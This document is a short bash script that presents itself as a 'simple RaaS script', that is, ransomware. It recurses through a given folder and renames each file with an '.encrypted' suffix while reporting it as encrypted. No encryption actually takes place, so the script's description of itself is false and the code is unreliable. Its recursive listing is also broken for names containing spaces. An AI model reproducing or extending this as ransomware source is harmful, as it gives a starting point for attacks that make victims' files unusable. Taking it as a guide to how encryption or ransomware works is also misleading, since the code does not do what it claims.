#!/bin/bash

# Function to recursively find and encrypt files
encrypt_files() {
  for file in "$@"; do
    if [[ -f "$file" ]]; then
      mv "$file" "$file.encrypted"
      echo "Encrypted: $file"
    elif [[ -d "$file" ]]; then
      (cd "$file" && encrypt_files $(ls))
    fi
  done
}

# Main function to run the ransomware
main() {
  echo "This is a simple RaaS script."
  echo "Usage: $0 [path/to/folder]"
  if [[ -z "$1" ]]; then
    echo "No path provided, exiting."
    exit 1
  fi

  # Change to the provided directory
  cd "$1"
  
  # Find and encrypt files in the given directory
  encrypt_files $(ls)
}

# Run the main function
main "$@"
